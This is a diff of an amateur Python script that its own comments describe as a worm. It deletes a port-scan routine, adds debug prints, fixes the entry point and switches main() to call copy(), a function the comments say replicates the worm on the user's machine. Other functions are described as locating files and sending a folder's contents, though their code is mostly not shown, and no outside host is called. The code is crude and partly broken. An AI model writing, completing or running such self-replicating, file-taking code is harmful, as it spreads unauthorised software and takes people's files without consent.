@@ -6,46 +6,20 @@
 import sys #allows for command line and creating files 
 import os #allows us access for command line as well but more clear
 import glob #helps with replication process and path finding 
-import nmap #should allow me to pull from the nmap; may not use
+#import nmap #should allow me to pull from the nmap; may not use
 import socket #should allow me to pull the ip address of the host machine of the virus
 import platform #gives me system info
 from sys import argv #uses arguments 
 import subprocess #allows you to use terminal commands 
 import shutil #allows use to do file movement
 
+print('I am staring in the void')
 
-def portscan():
-    #random issue
-    #the following will scan to make sure the email port of the target is open allowing it to be sent through. if it is not open then it will not execute
-
-    #first I need a target this takes the host name using socket
-    target=socket.gethostname()
-
-
-    #with help from Geek for Geek
-    target_addy = socket.gethostbyname(target) #now we have the IP addess of the host machine
-
-    #try making it into a list because we only want certain ports 
-    #emailports = 
-
-    #open scanner
-    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    #scan for the one port you need which is 587 since this is being sent via email and will move via email; state will hold the port status
-    state = scanner.connect_ex(target_addy, 587)
-
-    #if the port is 0 then it is open run next line
-    if state == 0:
-        print('Open!') #these are just fillers until I fix the other code
-    else:
-        #if its not then die
-        print('oops') #these are just fillers until I fix the other code
-
-    #close the socket idk just sounds safe
-    scanner.close()
 
 def wiggle():
     #the purpose of this function is to allow the worm to move and find files
+
+    print('I am staring in the wiggle')
 
     #first check the OS
     system = platform.system()
@@ -53,7 +27,7 @@ def wiggle():
     #the computer is linux 
     if(system == "Linux"):
         #get the current location
-        #currentpath = os.path.abspath("worm.py") #im gonna ignore this for now <3
+        currentpath = os.path.abspath("worm.py") #im gonna ignore this for now <3
 
         #need the username to properly get pathway names
         username = os.getlogin()
@@ -80,7 +54,8 @@ def wiggle():
 def copy():
 
     #code begins the copy function of the worm which allows it to replicate on the users computer
-    
+
+    print('I am staring in the copy')
     #began the worm copy method
     script = argv
 
@@ -95,6 +70,9 @@ def copy():
 
 def take():
     #the take method will create a file and send all the other files in that folder
+
+    print('I am staring in the take')
+
 
     #get the current location
     location = os.path.abspath("worm.py")
@@ -120,12 +98,11 @@ def take():
     #maybe encrypt the file idk
 
 def main():
-    wiggle()
-    #do I need these here?
-    #copy()
-    #take()
-
-if __name__=="_main_":
+    print("NOW STARTING")
+    copy()
+    
+if __name__ == "__main__":
     main()
+
 
 # The End 
